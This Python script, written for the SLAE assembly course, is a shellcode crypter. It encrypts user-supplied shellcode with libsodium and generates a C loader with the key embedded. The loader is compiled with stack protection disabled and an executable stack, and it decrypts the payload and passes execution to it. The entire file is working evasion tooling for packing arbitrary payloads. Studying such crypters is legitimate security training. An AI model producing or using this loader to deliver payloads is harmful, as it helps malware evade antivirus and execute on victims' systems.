#!/usr/bin/env python3
"""
Custom libsodium crypter; generates a C source file with an encrypted
shellcode embedded in it. The C is compiled and statically linked to DJB's
public domain Networking and Cryptography Library (NaCl) and to glibc. The program
decrypts and passes execution to the embedded shellcode.
Usage: this_script.py <destination filename> <hex_escaped_shellcode_to_crypt>
Author: fbcsec
This code was written to fulfill the requirements of the SecurityTube Linux Assembly Expert course:
http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/index.html
Student ID: SLAE - 1187
"""

import subprocess
import sys
import os

from jinja2 import Template
import nacl.secret
import nacl.utils

C_TEMPLATE = Template("""
#include <sodium.h>


const unsigned char ciphertext[{{clen + 1}}] = "{{c}}";
unsigned long long ciphertext_len = {{clen}};

const unsigned char key[crypto_secretbox_KEYBYTES+1] = "{{k}}";
const unsigned char nonce[crypto_secretbox_NONCEBYTES+1] = "{{n}}";

unsigned char output[{{mlen}}];


int main(void) {

    int (*call_output)() = (int(*)())output;

    int sodium_init();
    if (crypto_secretbox_open_easy(output, ciphertext, ciphertext_len, nonce, key) != 0) {
        return 1;
    }

    call_output();

    return 0;
}

""")


def array_hex_str_to_ints(list_of_hex_strings):
    """This function accepts a list of strings containing hex digits and
    converts each item into bytes.
    For example, [21, 41, 42, 43] is converted into [b'!', b'A', b'B', b'C']
    """

    for item in range(0, len(list_of_hex_strings)):
        list_of_hex_strings[item] = int(list_of_hex_strings[item], 16)

    return list_of_hex_strings


def process_shellcode(shellcode_input):
    """Convert a string of hex values formatted as C-style hex escapes
    into an array of integers.
    Returns bytes"""

    split_shellcode = shellcode_input.split("x")
    split_shellcode = split_shellcode[1::]  # Remove bogus empty string at start of array

    processed_shellcode = bytes(array_hex_str_to_ints(split_shellcode))

    return processed_shellcode


def c_format_binary_data(data):
    hex_escaped = ''
    for byte in data:
        formatted_byte = '\\x{0:0{1}X}'.format(byte, 2)
        hex_escaped += formatted_byte
    return hex_escaped


def encrypt_shellcode(key, shellcode):
    box = nacl.secret.SecretBox(key)
    return box.encrypt(shellcode)


def main():

    if len(sys.argv) != 3:
        print("Usage: %s <destination filename> <hex_escaped_shellcode_to_crypt>" % sys.argv[0])
        raise SystemExit

    output_filename = sys.argv[1]

    input_shellcode = process_shellcode(sys.argv[2])

    key = nacl.utils.random(nacl.secret.SecretBox.KEY_SIZE)  # Generate random key

    encrypted = nacl.secret.SecretBox(key).encrypt(input_shellcode)  # Encrypt shellcode

    nonce = encrypted.nonce  # Extract nonce from EncryptedMessage object
    ciphertext = encrypted.ciphertext  # Extract ciphertext from EncryptedMessage object

    rendered_c_template = C_TEMPLATE.render(c=c_format_binary_data(ciphertext),  # Render the C decrypter file
                                            clen=len(ciphertext),
                                            k=c_format_binary_data(key),
                                            n=c_format_binary_data(nonce),
                                            mlen=len(input_shellcode))

    with open(output_filename + '.c', 'w+') as cfile:
        cfile.write(rendered_c_template)

    subprocess.call(['gcc', output_filename + '.c', '-fno-stack-protector', '-z', 'execstack', '-m32', '-o',
                     output_filename + '.elf', '-ggdb', '-static', '-pthread', '-lpthread', '/usr/lib/i386-linux-gnu/libsodium.a'])
    #os.remove(output_filename + '.c')
    print('Finished %s' % output_filename + '.elf')


if __name__ == '__main__':
    main()
